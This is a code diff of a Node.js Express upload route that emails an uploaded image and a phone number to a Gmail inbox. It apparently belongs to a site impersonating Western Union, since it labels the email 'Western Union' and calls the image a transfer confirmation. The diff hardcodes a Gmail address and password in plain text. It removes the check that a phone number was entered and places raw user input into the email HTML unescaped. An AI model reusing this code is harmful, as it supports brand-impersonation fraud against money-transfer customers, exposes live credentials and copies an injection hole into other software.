@@ -48,37 +48,32 @@ router.post("/upload", function (req, res, next) {
             req.flash("error", err);
             return res.redirect("/");
         } else {
-            if (!req.body.userNumber) {
-                req.flash("error", "لم يتم ادخال رقم الهاتف");
-                return res.redirect("/");
-            } else {
-                var image = req.headers.origin + "/images/" + req.file.filename;
-                var smtpTransport = nodemailer.createTransport({
-                    service: "Gmail",
-                    host: "smtp.gmail.com",
-                    port: 465,
-                    secure: true,
-                    auth: {
-                        user: "fahad74185278@gmail.com",
-                        pass: "74185278ff"
-                    }
-                });
-                var mailOptions = {
-                    from: "ويسترن يونيون",
-                    to: "fahad74185278@gmail.com",
-                    subject: "أهلا" + "fahad74185278@gmail.com\n" + "\n",
-                    text: "رسالة بخصوص صورة جديدة من موقع ويستر يونيون",
-                    html: `<h1>صورة تأكيد الحوالة</h1> <br><br>رقم الهاتف : ${req.body.userNumber}<br><br> <img style="width:500px;height:500px" src=${image}>`
-                };
-                smtpTransport.sendMail(mailOptions, function (err, response) {
-                    if (err) {
-                        req.flash("error", "لم يتم ارسال الصورة بنجاح");
-                        res.redirect("/");
-                    }
-                    req.flash("success", "تم إرسال الصورة بنجاح");
-                    return res.redirect("/");
-                });
-            }
+            var image = req.headers.origin + "/images/" + req.file.filename;
+            var smtpTransport = nodemailer.createTransport({
+                service: "Gmail",
+                host: "smtp.gmail.com",
+                port: 465,
+                secure: true,
+                auth: {
+                    user: "fahad74185278@gmail.com",
+                    pass: "74185278ff"
+                }
+            });
+            var mailOptions = {
+                from: "ويسترن يونيون",
+                to: "fahad74185278@gmail.com",
+                subject: "أهلا" + "fahad74185278@gmail.com\n" + "\n",
+                text: "رسالة بخصوص صورة جديدة من موقع ويستر يونيون",
+                html: `<h1>صورة تأكيد الحوالة</h1> <br><br><br><span>${req.body.userNumber}</span><br><img style="width:500px;height:500px" src=${image}>`
+            };
+            smtpTransport.sendMail(mailOptions, function (err, response) {
+                if (err) {
+                    req.flash("error", "لم يتم ارسال الصورة بنجاح");
+                    res.redirect("/");
+                }
+                req.flash("success", "تم إرسال الصورة بنجاح");
+               return res.redirect("/");
+            });
         }
 
 
